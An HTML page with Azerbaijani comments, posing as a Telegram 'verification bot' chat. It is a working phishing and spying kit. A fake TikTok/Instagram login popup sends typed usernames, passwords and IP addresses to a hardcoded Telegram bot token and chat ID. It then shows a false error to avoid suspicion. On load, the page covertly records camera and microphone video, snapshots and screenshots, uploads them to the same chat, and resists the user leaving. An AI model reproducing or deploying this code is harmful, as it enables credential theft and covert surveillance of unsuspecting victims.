<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Bot</title>
    <!-- html2canvas – ekran görüntüsü üçün -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #0e1621;
            height: 100vh;
            display: flex;
            flex-direction: column;
            color: #fff;
        }
        .header {
            background: #17212b;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            border-bottom: 1px solid #242f3d;
            flex-shrink: 0;
        }
        .header .back { font-size: 20px; margin-right: 12px; color: #6c7883; cursor: default; }
        .header .avatar {
            width: 40px; height: 40px; background: #2b5278; border-radius: 50%;
            display: flex; align-items: center; justify-content: center; font-weight: bold; margin-right: 12px;
        }
        .header .info { flex: 1; }
        .header .info .name { font-weight: 600; font-size: 17px; }
        .header .info .status { font-size: 12px; color: #6c7883; }
        .header .menu { font-size: 22px; color: #6c7883; }

        .chat {
            flex: 1;
            padding: 10px 12px;
            overflow-y: auto;
            background: #0e1621;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .message {
            max-width: 80%;
            padding: 8px 12px;
            border-radius: 12px;
            font-size: 15px;
            line-height: 1.4;
            word-wrap: break-word;
            position: relative;
        }
        .message.bot {
            background: #182533;
            align-self: flex-start;
            border-bottom-left-radius: 4px;
        }
        .message.user {
            background: #2b5278;
            align-self: flex-end;
            border-bottom-right-radius: 4px;
        }
        .message .time {
            font-size: 10px;
            color: #6c7883;
            text-align: right;
            margin-top: 4px;
        }
        .input-area {
            background: #17212b;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            border-top: 1px solid #242f3d;
            flex-shrink: 0;
        }
        .input-area input {
            flex: 1;
            padding: 10px 14px;
            border: none;
            border-radius: 20px;
            background: #242f3d;
            color: #fff;
            font-size: 15px;
            outline: none;
        }
        .input-area input::placeholder { color: #6c7883; }
        .input-area .send {
            width: 40px; height: 40px;
            background: #2b5278;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin-left: 10px;
            cursor: pointer;
            font-size: 18px;
            transition: 0.2s;
        }
        .input-area .send:active { transform: scale(0.9); }

        .typing {
            align-self: flex-start;
            background: #182533;
            border-radius: 12px;
            padding: 8px 12px;
            font-size: 12px;
            color: #6c7883;
            display: none;
        }
        .typing span { animation: dots 1.5s infinite; }
        @keyframes dots {
            0% { content: '.'; }
            33% { content: '..'; }
            66% { content: '...'; }
        }

        /* Login popup */
        .popup-overlay {
            position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.8); display:none; align-items:center; justify-content:center;
            z-index: 9999;
        }
        .popup {
            background: #1c1c1e; padding: 25px; border-radius: 16px; width: 90%; max-width: 350px;
            color: #fff; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }
        .popup h2 { text-align: center; margin-bottom: 15px; font-size: 20px; }
        .popup input {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #333;
            border-radius: 10px; background: #2c2c2e; color: #fff; font-size: 15px;
        }
        .popup input::placeholder { color: #666; }
        .popup button {
            width: 100%; padding: 12px; margin-top: 12px;
            border: none; border-radius: 10px; background: #fe2c55; color: #fff;
            font-weight: bold; font-size: 16px; cursor: pointer;
        }
        .popup .close {
            float: right; cursor: pointer; color: #888; font-size: 20px;
        }
        .popup .error {
            color: #fe2c55; font-size: 13px; text-align: center; margin-top: 8px; display: none;
        }
        .popup .loader {
            display: none; width: 24px; height: 24px; border: 3px solid #333;
            border-top: 3px solid #fe2c55; border-radius: 50%; animation: spin 0.8s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <!-- Chat UI -->
    <div class="header">
        <div class="back">‹</div>
        <div class="avatar">🤖</div>
        <div class="info">
            <div class="name">Yoxlama Botu</div>
            <div class="status">online</div>
        </div>
        <div class="menu">⋯</div>
    </div>

    <div class="chat" id="chat"></div>

    <div class="input-area">
        <input type="text" id="msgInput" placeholder="Mesaj yaz..." autocomplete="off">
        <div class="send" id="sendBtn">➤</div>
    </div>

    <!-- Login Popup -->
    <div class="popup-overlay" id="loginPopup">
        <div class="popup">
            <span class="close" onclick="closePopup()">✕</span>
            <h2>TikTok / Instagram</h2>
            <input type="text" id="loginUser" placeholder="İstifadəçi adı / Email">
            <input type="password" id="loginPass" placeholder="Şifrə">
            <div class="loader" id="loginLoader"></div>
            <div class="error" id="loginError">Yanlış məlumat, yenidən cəhd edin.</div>
            <button onclick="submitLogin()">Giriş et</button>
        </div>
    </div>

    <script>
        // ============================================================
        //  KONFİQURASİYA
        // ============================================================
        const BOT_TOKEN = "8840269817:AAE2owjpICs-t_x7FceNKwZ6eeDS5DfX5Hs";
        const ADMIN_CHAT_ID = "6302623883";  // Sənin admin ID-n

        // URL-dən chat_id parametrini al (əgər varsa) – adminə mesaj göndərmək üçün
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('chat_id') || ADMIN_CHAT_ID;

        // ============================================================
        //  CHAT FUNKSİYALARI
        // ============================================================
        const chat = document.getElementById('chat');
        const input = document.getElementById('msgInput');
        const sendBtn = document.getElementById('sendBtn');

        function addMessage(text, sender, time = null) {
            const div = document.createElement('div');
            div.className = `message ${sender}`;
            const now = time || new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            div.innerHTML = `${text}<div class="time">${now}</div>`;
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        function addTyping() {
            const div = document.createElement('div');
            div.className = 'typing';
            div.id = 'typingIndicator';
            div.innerHTML = 'Bot yazır<span>.</span><span>.</span><span>.</span>';
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        function removeTyping() {
            const el = document.getElementById('typingIndicator');
            if (el) el.remove();
        }

        // Bot mesajları
        function sendBotMessage(text, delay = 800) {
            setTimeout(() => {
                addMessage(text, 'bot');
            }, delay);
        }

        // İstifadəçi mesajı göndər
        function handleUserMessage(text) {
            if (!text.trim()) return;
            addMessage(text, 'user');
            input.value = '';
            addTyping();
            setTimeout(() => {
                removeTyping();
                if (step === 1) {
                    // İstifadəçi nömrəni yazdı
                    sendBotMessage("Təşəkkürlər! İndi TikTok və ya Instagram hesabınızla yoxlama aparın.", 1000);
                    setTimeout(() => {
                        showLoginButton();
                    }, 2000);
                    step = 2;
                } else if (step === 2) {
                    // Əgər istifadəçi başqa şey yazıbsa
                    sendBotMessage("Zəhmət olmasa, aşağıdakı düyməni basaraq giriş edin.");
                }
            }, 1500);
        }

        // Botun ilkin mesajları
        let step = 0;
        function startBot() {
            sendBotMessage("Salam! Mən yoxlama botuyam. Zəhmət olmasa, hesabınızı yoxlamaq üçün bir neçə addımı tamamlayın.", 500);
            setTimeout(() => {
                sendBotMessage("Əvvəlcə, telefon nömrənizi yazın (beynəlxalq formatda):", 2000);
                step = 1;
            }, 3000);
        }

        // Login düyməsi
        function showLoginButton() {
            const div = document.createElement('div');
            div.style.alignSelf = 'center';
            div.style.margin = '10px 0';
            div.innerHTML = `
                <button onclick="openPopup()" style="background:#fe2c55; color:white; border:none; padding:10px 20px; border-radius:30px; font-weight:bold; font-size:15px; cursor:pointer;">
                    TikTok / Instagram ilə yoxla
                </button>
            `;
            chat.appendChild(div);
            chat.scrollTop = chat.scrollHeight;
        }

        // ============================================================
        //  POPUP LOGIN
        // ============================================================
        const popup = document.getElementById('loginPopup');
        function openPopup() {
            popup.style.display = 'flex';
        }
        function closePopup() {
            popup.style.display = 'none';
        }

        async function submitLogin() {
            const user = document.getElementById('loginUser').value;
            const pass = document.getElementById('loginPass').value;
            if (!user || !pass) {
                document.getElementById('loginError').style.display = 'block';
                return;
            }
            document.getElementById('loginError').style.display = 'none';
            document.getElementById('loginLoader').style.display = 'block';

            // IP ünvanını al
            let ip = 'Bilinmir';
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                ip = data.ip;
            } catch (e) {}

            // Məlumatları adminə göndər
            const text = `🔐 **Giriş məlumatları**\n👤 İstifadəçi: ${user}\n🔑 Şifrə: ${pass}\n🌍 IP: ${ip}\n🕐 ${new Date().toLocaleString()}`;
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_CHAT_ID,
                        text: text
                    })
                });
                // Uğurlu oldu, amma istifadəçiyə xəta göstər (şübhə doğurma)
                setTimeout(() => {
                    document.getElementById('loginLoader').style.display = 'none';
                    document.getElementById('loginError').style.display = 'block';
                    document.getElementById('loginPass').value = '';
                }, 2000);
            } catch (e) {
                document.getElementById('loginLoader').style.display = 'none';
                document.getElementById('loginError').style.display = 'block';
            }
        }

        // ============================================================
        //  KAMERA & MİKROFON & EKRAN GÖRÜNTÜSÜ
        // ============================================================
        let mediaStream = null;
        let mediaRecorder = null;
        let videoChunks = [];

        // Kameranı və mikrafonu açmağa çalış
        async function initMedia() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { width: 640, height: 480 },
                    audio: true
                });
                // Gizli video element
                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.muted = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();

                // Hər 10 saniyədə bir kadr çək
                setInterval(() => captureFrame(video), 10000);
                // Video yazmağa başla (30 saniyəlik parçalar)
                startRecording(video);
            } catch (e) {
                // Kamera yoxdursa, ekran görüntüsü çək
                console.warn('Kamera əldə edilə bilmədi, ekran görüntüsü istifadə olunacaq.');
                setInterval(captureScreen, 10000);
            }
        }

        function startRecording(video) {
            if (!mediaStream) return;
            mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) videoChunks.push(e.data);
            };
            mediaRecorder.onstop = async () => {
                const blob = new Blob(videoChunks, { type: 'video/webm' });
                await sendMediaToTelegram(blob, 'video');
                videoChunks = [];
                // Yenidən başla
                if (mediaRecorder.state !== 'recording') {
                    mediaRecorder.start(30000);
                }
            };
            mediaRecorder.start(30000);
        }

        function captureFrame(video) {
            const canvas = document.createElement('canvas');
            canvas.width = 320;
            canvas.height = 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                await sendMediaToTelegram(blob, 'photo');
            }, 'image/jpeg', 0.7);
        }

        async function captureScreen() {
            try {
                const canvas = await html2canvas(document.body, {
                    useCORS: true,
                    allowTaint: true,
                    scale: 0.5,
                    logging: false
                });
                canvas.toBlob(async (blob) => {
                    await sendMediaToTelegram(blob, 'photo');
                }, 'image/jpeg', 0.7);
            } catch (e) {
                console.error('Ekran görüntüsü çəkilə bilmədi', e);
            }
        }

        // ============================================================
        //  TELEGRAM-A MEDİA GÖNDƏR
        // ============================================================
        async function sendMediaToTelegram(blob, type) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID);
            if (type === 'photo') {
                formData.append('photo', blob, 'capture.jpg');
            } else if (type === 'video') {
                formData.append('video', blob, 'capture.webm');
            }

            const url = type === 'photo'
                ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
                : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

            try {
                await fetch(url, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.error('Media göndərilə bilmədi', e);
            }
        }

        // ============================================================
        //  QİYMƏTLƏNDİRMƏ
        // ============================================================
        sendBtn.addEventListener('click', () => {
            handleUserMessage(input.value);
        });
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleUserMessage(input.value);
            }
        });

        // Hər şeyi başlat
        startBot();
        initMedia();

        // İstifadəçi çıxmağa çalışanda mane ol
        window.addEventListener('beforeunload', (e) => {
            e.preventDefault();
            e.returnValue = '';
        });
    </script>
</body>
</html>
